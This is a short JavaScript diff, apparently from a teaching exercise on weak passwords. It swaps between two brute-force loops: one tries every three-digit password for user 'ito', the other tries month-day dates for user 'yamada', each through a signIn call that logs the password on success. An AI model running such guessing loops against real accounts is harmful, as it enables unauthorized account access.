@@ -26,29 +26,29 @@ window.onload = ()=>{
 		
 
 		// 1st try!!
-		// const id = "ito";
-		// for(let i=0; i<1000; i++){
-		// 	const pass = n2s(3, i);
-		// 	console.log(id, pass);
-		// 	const result = await signIn(id, pass);// 認証時間がかかる
-		// 	if(result){
-		// 		console.log("Success:", id, pass);
-		// 		return;
-		// 	}
-		// }
-
-		// 2nd try!!
-		const id = "yamada";
-		for(let m=10; m<=12; m++){
-			for(let d=1; d<=31; d++){
-				const pass = n2s(2, m) + n2s(2, d)
-				const result = await signIn(id, pass);// 認証時間がかかる
-				if(result){
-					console.log("Success:", id, pass);
-					return;
-				}
+		const id = "ito";
+		for(let i=0; i<1000; i++){
+			const pass = n2s(3, i);
+			console.log(id, pass);
+			const result = await signIn(id, pass);// 認証時間がかかる
+			if(result){
+				console.log("Success:", id, pass);
+				return;
 			}
 		}
+
+		// 2nd try!!
+		// const id = "yamada";
+		// for(let m=10; m<=12; m++){
+		// 	for(let d=1; d<=31; d++){
+		// 		const pass = n2s(2, m) + n2s(2, d)
+		// 		const result = await signIn(id, pass);// 認証時間がかかる
+		// 		if(result){
+		// 			console.log("Success:", id, pass);
+		// 			return;
+		// 		}
+		// 	}
+		// }
 
 		console.log("Failed...");
 	}
